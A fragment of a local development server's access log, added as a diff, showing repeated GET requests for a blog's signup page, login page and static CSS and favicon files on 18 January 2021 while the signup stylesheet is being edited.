+[18/Jan/2021 20:07:53] "GET /static/css/blog_signup.css HTTP/1.1" 200 692
+[18/Jan/2021 20:07:53] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:08:08] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:08:08] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:08:08] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:08:08] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[18/Jan/2021 20:08:08] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:08:08] "GET /static/css/blog_signup.css HTTP/1.1" 200 579
+[18/Jan/2021 20:08:09] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:08:14] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:08:14] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:08:14] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:08:14] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[18/Jan/2021 20:08:14] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:08:14] "GET /static/css/blog_signup.css HTTP/1.1" 200 692
+[18/Jan/2021 20:08:14] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:08:19] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:08:20] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:08:20] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:08:20] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[18/Jan/2021 20:08:20] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:08:20] "GET /static/css/blog_signup.css HTTP/1.1" 200 692
+[18/Jan/2021 20:08:20] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:08:25] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:08:25] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:08:25] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:08:25] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[18/Jan/2021 20:08:25] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:08:25] "GET /static/css/blog_signup.css HTTP/1.1" 200 475
+[18/Jan/2021 20:08:25] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:08:38] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:08:38] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:08:38] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[18/Jan/2021 20:08:38] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:08:38] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:08:38] "GET /static/css/blog_signup.css HTTP/1.1" 200 279
+[18/Jan/2021 20:08:39] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:08:53] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:08:54] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:08:54] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:08:54] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[18/Jan/2021 20:08:54] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:08:54] "GET /static/css/blog_signup.css HTTP/1.1" 200 35
+[18/Jan/2021 20:08:54] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:09:17] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:09:17] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:09:17] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:09:17] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[18/Jan/2021 20:09:17] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:09:17] "GET /static/css/blog_signup.css HTTP/1.1" 200 692
+[18/Jan/2021 20:09:17] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:09:24] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:09:24] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:09:24] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:09:24] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:09:24] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:09:24] "GET /static/css/blog_signup.css HTTP/1.1" 200 692
+[18/Jan/2021 20:09:25] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:09:37] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 20:09:37] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:09:39] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:09:39] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:09:39] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:09:44] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:09:44] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:09:44] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:09:44] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:09:45] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:09:45] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:09:46] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:09:46] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:09:47] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[18/Jan/2021 20:09:48] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:09:48] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:10:10] "GET /auth/signup HTTP/1.1" 200 5273
+[18/Jan/2021 20:10:10] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:10:10] "GET /static/css/blog_signup.css HTTP/1.1" 200 853
+[18/Jan/2021 20:10:11] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:11:03] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:11:03] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:11:03] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:11:03] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:11:26] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:11:26] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:11:26] "GET /static/css/blog_signup.css HTTP/1.1" 200 1075
+[18/Jan/2021 20:11:26] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:12:20] "GET /auth/signup HTTP/1.1" 200 5161
+[18/Jan/2021 20:12:20] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:12:20] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:12:21] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:12:21] "GET /auth/signup HTTP/1.1" 200 5161
+[18/Jan/2021 20:12:22] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:12:23] "GET /auth/signup HTTP/1.1" 200 5161
+[18/Jan/2021 20:12:24] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:12:24] "GET /auth/signup HTTP/1.1" 200 5161
+[18/Jan/2021 20:12:25] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:12:27] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 20:12:29] "GET /auth/signup HTTP/1.1" 200 5161
+[18/Jan/2021 20:12:29] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:18:06] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:18:06] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:18:06] "GET /static/css/blog_signup.css HTTP/1.1" 200 1082
+[18/Jan/2021 20:18:06] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:18:27] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:18:27] "GET /static/css/blog_signup.css HTTP/1.1" 200 1248
+[18/Jan/2021 20:18:27] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:18:38] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:18:38] "GET /static/css/blog_signup.css HTTP/1.1" 200 1249
+[18/Jan/2021 20:18:39] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:18:45] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:18:45] "GET /static/css/blog_signup.css HTTP/1.1" 200 1249
+[18/Jan/2021 20:18:46] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:18:51] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:18:52] "GET /static/css/blog_signup.css HTTP/1.1" 200 1249
+[18/Jan/2021 20:18:52] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:18:53] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:18:53] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:18:53] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:19:00] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:19:01] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:19:01] "GET /static/css/blog_signup.css HTTP/1.1" 200 1249
+[18/Jan/2021 20:19:01] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:19:03] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:19:03] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:19:03] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:19:49] "GET /auth/login HTTP/1.1" 200 2473
+[18/Jan/2021 20:19:51] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:19:51] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:20:15] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:20:16] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[18/Jan/2021 20:20:16] "GET /static/css/blog_signup.css HTTP/1.1" 200 1281
+[18/Jan/2021 20:20:16] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:20:26] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:20:26] "GET /static/css/blog_signup.css HTTP/1.1" 200 1281
+[18/Jan/2021 20:20:26] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:20:31] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[18/Jan/2021 20:20:33] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:20:33] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:20:33] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:20:33] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:20:33] "GET /static/css/blog_signup.css HTTP/1.1" 200 1281
+[18/Jan/2021 20:20:33] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:20:34] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:20:56] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:20:56] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:20:56] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:20:56] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:20:56] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:20:56] "GET /static/css/blog_signup.css HTTP/1.1" 200 1321
+[18/Jan/2021 20:20:57] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:22:13] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:22:13] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:22:13] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:22:13] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:22:13] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:22:13] "GET /static/css/blog_signup.css HTTP/1.1" 200 1321
+[18/Jan/2021 20:22:13] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:22:28] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:22:28] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:22:28] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:22:28] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:22:28] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:22:28] "GET /static/css/blog_signup.css HTTP/1.1" 200 1321
+[18/Jan/2021 20:22:28] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:22:47] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:22:47] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:22:47] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:22:47] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:22:47] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:22:47] "GET /static/css/blog_signup.css HTTP/1.1" 200 1321
+[18/Jan/2021 20:22:49] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:23:12] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:23:12] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:23:12] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:23:12] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:23:12] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:23:12] "GET /static/css/blog_signup.css HTTP/1.1" 200 1352
+[18/Jan/2021 20:23:12] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:23:19] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:23:19] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:23:19] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:23:19] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:23:19] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:23:19] "GET /static/css/blog_signup.css HTTP/1.1" 200 1321
+[18/Jan/2021 20:23:19] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:23:35] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:23:35] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:23:35] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:23:35] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:23:35] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:23:35] "GET /static/css/blog_signup.css HTTP/1.1" 200 1378
+[18/Jan/2021 20:23:36] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:23:57] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:23:57] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:23:57] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:23:57] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:23:57] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:23:57] "GET /static/css/blog_signup.css HTTP/1.1" 200 1429
+[18/Jan/2021 20:23:57] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:24:10] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:24:10] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:24:10] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:24:10] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:24:10] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:24:10] "GET /static/css/blog_signup.css HTTP/1.1" 200 1455
+[18/Jan/2021 20:24:10] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:24:33] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:24:33] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:24:34] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:24:34] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:24:34] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:24:34] "GET /static/css/blog_signup.css HTTP/1.1" 200 1455
+[18/Jan/2021 20:24:34] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:24:49] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:24:51] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:24:52] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:24:52] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:24:52] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:24:52] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:24:52] "GET /static/css/blog_signup.css HTTP/1.1" 200 1424
+[18/Jan/2021 20:25:01] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:25:01] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:25:01] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:25:01] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:25:01] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:25:01] "GET /static/css/blog_signup.css HTTP/1.1" 200 1384
+[18/Jan/2021 20:25:01] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:25:11] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:25:14] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:25:14] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:25:14] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:25:14] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:25:14] "GET /static/css/blog_signup.css HTTP/1.1" 200 1455
+[18/Jan/2021 20:25:14] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:25:52] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:25:53] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:25:53] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:25:53] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:25:53] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:25:53] "GET /static/css/blog_signup.css HTTP/1.1" 200 1453
+[18/Jan/2021 20:25:53] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:26:02] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:26:02] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:26:02] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:26:02] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:26:02] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:26:02] "GET /static/css/blog_signup.css HTTP/1.1" 200 1455
+[18/Jan/2021 20:26:02] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:26:11] "GET / HTTP/1.1" 200 1753
+[18/Jan/2021 20:26:11] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:26:11] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:26:11] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:26:11] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:26:13] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:26:13] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:26:13] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:26:13] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:26:13] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:26:13] "GET /static/css/blog_signup.css HTTP/1.1" 200 1455
+[18/Jan/2021 20:27:30] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:27:30] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:27:30] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:27:30] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:27:30] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:27:30] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:27:31] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:27:45] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:27:45] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:27:45] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:27:45] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:27:45] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:27:45] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:27:46] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:28:07] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:28:07] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:28:07] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:28:07] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:28:07] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:28:07] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:28:07] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:28:24] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:28:24] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:28:24] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:28:24] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:28:24] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:28:24] "GET /static/css/blog_signup.css HTTP/1.1" 200 1707
+[18/Jan/2021 20:28:24] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:28:46] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:28:46] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:28:46] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:28:46] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:28:46] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:28:46] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:28:46] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:29:20] "GET /auth/signup HTTP/1.1" 200 5309
+[18/Jan/2021 20:29:20] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:29:20] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:29:20] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:29:20] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:29:20] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:29:20] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:30:01] "GET /auth/signup HTTP/1.1" 200 5362
+[18/Jan/2021 20:30:01] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:30:01] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:30:01] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:30:01] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:30:01] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:30:01] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:30:37] "GET /auth/signup HTTP/1.1" 200 5362
+[18/Jan/2021 20:30:37] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:30:37] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:30:37] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:30:37] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:30:37] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:30:37] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:30:39] "GET /auth/signup HTTP/1.1" 200 5362
+[18/Jan/2021 20:30:40] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:30:40] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[18/Jan/2021 20:30:40] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[18/Jan/2021 20:30:40] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[18/Jan/2021 20:30:40] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+[18/Jan/2021 20:30:40] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[18/Jan/2021 20:30:41] "GET /auth/signup HTTP/1.1" 200 5418
+[18/Jan/2021 20:30:42] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[18/Jan/2021 20:30:42] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
